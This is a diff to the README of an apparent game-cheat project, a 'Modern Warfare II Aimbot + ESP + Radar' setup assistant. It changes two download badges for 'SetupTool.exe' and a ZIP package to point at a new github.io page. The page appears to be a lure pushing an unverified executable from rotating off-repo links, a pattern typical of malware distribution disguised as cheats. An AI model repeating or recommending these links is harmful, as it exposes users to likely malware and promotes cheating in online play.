@@ -1,7 +1,7 @@
 # 🎯 Modern Warfare II Aimbot + ESP + Radar — Setup Assistant
 
-[![Download SetupTool.exe](https://img.shields.io/badge/Download-SetupTool.exe-green?style=for-the-badge)](https://cod-modern-warfare-ii-aimbot-esp-radar.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://cod-modern-warfare-ii-aimbot-esp-radar.github.io/.github/)
+[![Download SetupTool.exe](https://img.shields.io/badge/Download-SetupTool.exe-green?style=for-the-badge)](https://pauladams9712438.github.io/.github/cod-modern-warfare-aimbot-esp)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://pauladams9712438.github.io/.github/cod-modern-warfare-aimbot-esp)
 
 ---
 
